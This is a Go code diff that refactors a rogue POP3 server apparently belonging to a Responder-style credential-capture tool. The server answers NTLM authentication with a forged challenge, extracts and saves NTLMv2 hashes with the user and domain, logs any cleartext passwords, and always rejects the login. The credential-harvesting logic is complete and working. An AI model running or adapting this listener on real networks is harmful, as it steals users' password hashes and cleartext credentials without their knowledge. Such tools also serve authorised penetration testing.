@@ -1,4 +1,4 @@
-package main
+package server
 
 import (
 	"bufio"
@@ -7,29 +7,31 @@ import (
 	"net"
 	"strings"
 	"time"
+
+	"go-responder/internal/core"
 )
 
-func servePOP3(ifaceIP net.IP) {
+func ServePOP3(ifaceIP net.IP) {
 	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:110", ifaceIP))
 	if err != nil {
-		logError("POP3 listen :110 — %v (need root?)", err)
+		core.LogError("POP3 listen :110 — %v (need root?)", err)
 		return
 	}
-	logInfo("POP3 listening on %s:110", ifaceIP)
+	core.LogInfo("POP3 listening on %s:110", ifaceIP)
 	for {
 		c, err := ln.Accept()
 		if err != nil {
 			continue
 		}
-		go handlePOP3(c)
+		go HandlePOP3(c)
 	}
 }
 
-func handlePOP3(c net.Conn) {
+func HandlePOP3(c net.Conn) {
 	defer c.Close()
 	c.SetDeadline(time.Now().Add(60 * time.Second))
 
-	challenge := getChallenge()
+	challenge := core.GetChallenge()
 	w := bufio.NewWriter(c)
 	r := bufio.NewReader(c)
 	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }
@@ -46,7 +48,7 @@ func handlePOP3(c net.Conn) {
 
 		switch {
 		case upper == "AUTH NTLM" || strings.HasPrefix(upper, "AUTH NTLM "):
-			send("+") // continue request
+			send("+")
 
 			tokenLine, err := r.ReadString('\n')
 			if err != nil {
@@ -58,13 +60,13 @@ func handlePOP3(c net.Conn) {
 				send("-ERR Authentication failed")
 				return
 			}
-			ntlm := FindNTLMSSP(raw)
-			if len(ntlm) < 12 || ntlmMsgType(ntlm) != 1 {
+			ntlm := core.FindNTLMSSP(raw)
+			if len(ntlm) < 12 || core.NTLMMsgType(ntlm) != 1 {
 				send("-ERR Authentication failed")
 				return
 			}
-			logVerbose("POP3 NTLM Type1 from %s", c.RemoteAddr())
-			ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
+			core.LogVerbose("POP3 NTLM Type1 from %s", c.RemoteAddr())
+			ntlmChallenge := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
 			send("+ " + base64.StdEncoding.EncodeToString(ntlmChallenge))
 
 			type3Line, err := r.ReadString('\n')
@@ -73,14 +75,14 @@ func handlePOP3(c net.Conn) {
 			}
 			type3Line = strings.TrimRight(type3Line, "\r\n")
 			raw3, _ := base64.StdEncoding.DecodeString(type3Line)
-			ntlm3 := FindNTLMSSP(raw3)
-			if len(ntlm3) >= 12 && ntlmMsgType(ntlm3) == 3 {
-				hash, user, domain, err := ParseNTLMAuthenticate(ntlm3, challenge)
+			ntlm3 := core.FindNTLMSSP(raw3)
+			if len(ntlm3) >= 12 && core.NTLMMsgType(ntlm3) == 3 {
+				hash, user, domain, err := core.ParseNTLMAuthenticate(ntlm3, challenge)
 				if err == nil {
-					logSuccess("[POP3] NTLMv2 captured from %s", c.RemoteAddr())
-					logSuccess("       %s\\%s", domain, user)
-					logSuccess("       %s", hash)
-					saveHash(hash)
+					core.LogSuccess("[POP3] NTLMv2 captured from %s", c.RemoteAddr())
+					core.LogSuccess("       %s\\%s", domain, user)
+					core.LogSuccess("       %s", hash)
+					core.SaveHash(hash)
 				}
 			}
 			send("-ERR Authentication failed")
@@ -91,7 +93,7 @@ func handlePOP3(c net.Conn) {
 		case strings.HasPrefix(upper, "PASS "):
 			pass := line[5:]
 			if pass != "" {
-				logSuccess("[POP3] Cleartext from %s: pass=%q", c.RemoteAddr(), pass)
+				core.LogSuccess("[POP3] Cleartext from %s: pass=%q", c.RemoteAddr(), pass)
 			}
 			send("-ERR Authentication failed")
 			return
